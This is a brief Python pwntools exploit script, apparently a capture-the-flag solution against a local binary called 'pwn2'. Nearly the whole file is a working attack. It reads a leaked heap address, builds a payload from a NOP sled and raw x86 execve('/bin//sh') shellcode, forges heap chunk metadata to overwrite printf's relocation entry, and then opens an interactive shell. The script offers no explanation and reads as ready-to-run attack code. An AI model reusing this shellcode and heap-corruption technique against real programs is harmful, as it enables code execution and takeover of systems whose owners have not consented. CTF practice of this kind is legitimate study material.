from pwn import *
import re
context.log_level='debug'
reloc_printf = 0x0804c004 # ir~printf

#conn = remote ('127.0.0.1', 8080)
conn = process('./pwn2')
output = conn.recv()

s = re.search ("\[ALLOC\]\[loc=[a-z,A-z,0-9]+\[size=260\]", output)
dir_shellcode = int(s.group()[12:19],16)
nop = "\x90" * 30
log.info("heap_addr:%#x",dir_shellcode)
#shellcode from http://shell-storm.org/shellcode/files/shellcode-752.php
shellcode = nop + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

#gdb.attach(conn)#,"b free\n"
payload = "\xeb\x0c" # jmp_patch
payload += shellcode
payload += "A"* (260 - len(payload))
payload += p32(9) # make the next chunk free
payload += p32(reloc_printf - 8)
payload += p32(dir_shellcode)

conn.send (payload + '\n')
conn.interactive()
